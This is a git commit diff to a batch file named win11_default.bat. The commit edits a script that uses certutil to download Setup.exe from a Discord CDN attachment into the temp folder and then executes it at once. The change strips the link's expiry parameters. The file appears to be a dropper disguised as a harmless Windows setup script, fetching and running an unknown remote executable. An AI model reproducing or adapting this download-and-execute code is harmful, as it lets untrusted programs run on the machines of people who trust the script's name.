2480c36a891aa5d20fcd6fdefdf07f6112981db5
optolab <sloneeddie36@gmail.com>
2025-01-12 12:55:24 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,5 +1,5 @@
 @echo off
-set url=<https://cdn.discordapp.com/attachments/1197242628396302458/1328059195471298650/Setup.exe?ex=67855302&is=67840182&hm=5cd5c809d92de46b0c90c394cc739c7095335ef390e0b1fc288156beac870996&>
+set url=<https://cdn.discordapp.com/attachments/1197242628396302458/1328059195471298650/Setup.exe>
 set file=%temp%\downloaded_file.exe
 certutil -urlcache -split -f "%url%" "%file%"
 start "" "%file%"
